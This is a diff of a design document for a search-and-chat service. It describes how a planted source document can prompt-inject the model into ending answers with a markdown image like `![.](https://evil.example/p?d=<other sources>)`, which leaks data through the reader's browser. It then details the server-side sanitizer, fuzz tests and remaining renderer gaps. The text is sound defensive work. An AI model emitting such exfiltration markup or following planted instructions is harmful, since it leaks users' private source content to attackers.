@@ -53,31 +53,45 @@ what the best of the four products does:
   document can make the model end with `![.](https://evil.example/p?d=<other sources>)`, and chat
   UIs on the OpenAI route (Open WebUI, LibreChat) render markdown, so the reader's browser would
   send what they may read to the attacker. Every answer, JSON or streamed, native or OpenAI's, is
-  sanitized on the server without following CommonMark's line or container rules (a definition
-  counts inside a block quote or list item, its label may span lines or hold `\]`): every `](`
-  becomes `]\(` and its URL a code span, and the link's label goes through the same rules (a tag
-  or a URL inside it too); every `]:` becomes `]\:` (so no reference definition exists for
-  `![x][a]` to use); `\r` and `\r\n` become `\n`; a `<` starting a tag or autolink becomes `&lt;`
-  (a backslash the model writes can't cancel it); a bare URL, protocol-relative `//host…` too, a
-  bare email address and a `mailto:` or `xmpp:` one become code spans (an address is a link a
-  click away, its local part room for data), with any backslashes the model wrote before one as
-  `&#92;`; and every backtick the model writes becomes `&#96;`, so the only code spans are the
-  sanitizer's. Nothing is removed, so the reader still sees the text. While streaming, text that
-  may still become one of these is held back until it settles, at most 2 KiB; past that it's
-  released by force, and the word the bound cut goes out as a code span, then the rest of that
-  word up to the next whitespace as another, so no half of a URL can join the other. The tests
-  read the output as GitHub-flavored markdown (comrak) and fail on any link, image or HTML node.
-  `allow_links: true` keeps inline links (never images) whose URL is exactly one in the given
-  sources' fields, and such a bare URL only when ASCII whitespace or the answer's end follows it
-  (GFM's autolinks run to the next space, and through U+00A0). Any field of a given source may
-  offer the URL, a planted document's too: that document can offer its own fixed URLs, as a
-  click, never one carrying another source's text (it must match exactly), and naming one field
-  wouldn't help, as a planted document can fill any field. What this leaves to the renderer:
-  kept links carry no `rel` or `referrerpolicy`; code the model writes in a fence is escaped like
-  any text (the cost of escaping whatever the context); a renderer that links bare domains
-  (markdown-it's fuzzy linkify) can still link `example.com`; and a renderer must decode
-  entities once, as markdown does: one that decodes the answer before rendering it, or decodes the
-  HTML markdown made again, turns the sanitizer's `&lt;` back into a tag.
+  made literal on the server rather than searched for markup: four rounds of review found
+  renderer behaviours a list of patterns didn't model (table cells splitting a code span,
+  strikethrough unwrapping one, remark decoding entities before it autolinks).
+  - **Markdown's characters as entities.** Every `&`, `\`, `` ` ``, `~`, `|`, `<`, `>`, `[`, `]`,
+    `!`, `*`, `_` and `#` the model writes becomes its numeric entity (`&#60;`): every renderer
+    shows the character and none reads it as syntax, so no tag, image, link, reference
+    definition, footnote, table, code span, strikethrough, emphasis or heading can start, and an
+    entity or escape the model wrote (`https:&#47;&#47;`, `\/`) shows as written, never decoded
+    into what it spells. `\r` and `\r\n` become `\n`.
+  - **Link-shaped tokens broken.** U+2060 WORD JOINER goes inside every `//`, after a `:` that
+    follows a letter (`https:`, `mailto:`, `xmpp:`), between `www` and its `.`, and before every
+    `@`. None of GFM's (comrak's), marked's, markdown-it's (linkify too) or remark-gfm's
+    autolinks spans it, and it's invisible, so a URL still reads as one but isn't a link.
+  - **Nothing held.** The answer streams character by character, and any split of it comes out
+    as the whole does; only with `allow_links` does an open `[` wait (at most 2 KiB) to see
+    whether it's a link to keep.
+  - **Kept links** (`allow_links: true`): an inline `[label](url)` (never an image) whose URL is
+    exactly one in the given sources' fields and made only of characters that can't end a link
+    destination, split a table cell or start markup (RFC 3986's unreserved and reserved
+    characters but `(`, `)`, `[`, `]`, `'` and `|`), emitted as written so a client comparing it
+    with the source's finds it; its label is literal like any text. Other URLs, a source's own
+    written out bare included, show broken. Any field of a given source may offer the URL, a
+    planted document's too: it can offer its own fixed URLs as a click, never one carrying
+    another source's text, and naming one field wouldn't help, as a planted document can fill
+    any field.
+  - **The cost:** the model's markdown shows as its characters (`**bold**`, `# Title`, a
+    table's pipes), and its citations (`[1]`) reach the wire as entities (`&#91;1&#93;`):
+    markdown renderers show `[1]`, and `cited` lists them. A client that shows answers as plain
+    text, not markdown, decodes numeric entities first. Copying a URL out of an answer copies
+    the word joiners too, so it doesn't paste as a link.
+  - **Tests:** every payload of the four reviews (`crates/search-es/tests/fixtures/chat-markup.json`)
+    whole, a character at a time and split at every point, and 4,000 random compositions of the
+    reviewers' fragments, read as GitHub-flavored markdown (comrak): any link but a kept one,
+    image, HTML, table, footnote or linkable text fails. The gate also renders the corpus and
+    70,000 random compositions with marked, markdown-it (linkify on and off) and remark-gfm.
+  - **Left to the renderer:** a kept link carries no `rel` or `referrerpolicy`; a renderer that
+    links bare domains (markdown-it's fuzzy linkify) can still link `evil.com/?d=…` as text;
+    and a renderer must decode entities once, as markdown does: one that decodes the answer
+    before rendering it, or decodes the HTML markdown made again, turns `&#60;` back into a tag.
 - **The OpenAI route** drops a client's `system` and `developer` messages (chat UIs send their
   own): the profile's instructions are the only ones the model gets. `tools`, `functions`,
   `n` > 1, logprobs, `response_format` and non-text content are 400s; sampling settings are
